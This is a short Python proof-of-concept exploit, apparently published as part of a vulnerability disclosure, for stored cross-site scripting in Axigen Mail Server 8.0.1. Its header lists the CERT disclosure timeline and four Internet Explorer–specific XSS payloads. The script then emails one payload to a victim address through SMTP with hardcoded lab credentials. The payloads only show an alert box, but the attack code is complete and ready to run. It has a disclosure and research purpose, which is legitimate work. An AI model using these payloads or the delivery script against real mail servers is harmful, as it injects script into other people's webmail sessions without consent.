#!/usr/bin/python

'''
Author: loneferret of Offensive Security
Product: Axigen Mail Server
Version: 8.0.1 (Windows/x86)
Vendor Site: http://www.axigen.com
Software Download Link: http://www.axigen.com/mail-server/download-axigen-mail-server-801-for-windows.html

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure


Installed On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9

Injection Point:  Body
Injection Payload(s):

1: <DIV STYLE="width: expression(alert('XSS'));">
2: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
3: <XSS STYLE="xss:expression(alert('XSS'))">
4: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]--

'''


import smtplib, urllib2

payload = """<DIV STYLE="width: expression(alert('XSS'));">"""

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: Offensive Security\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)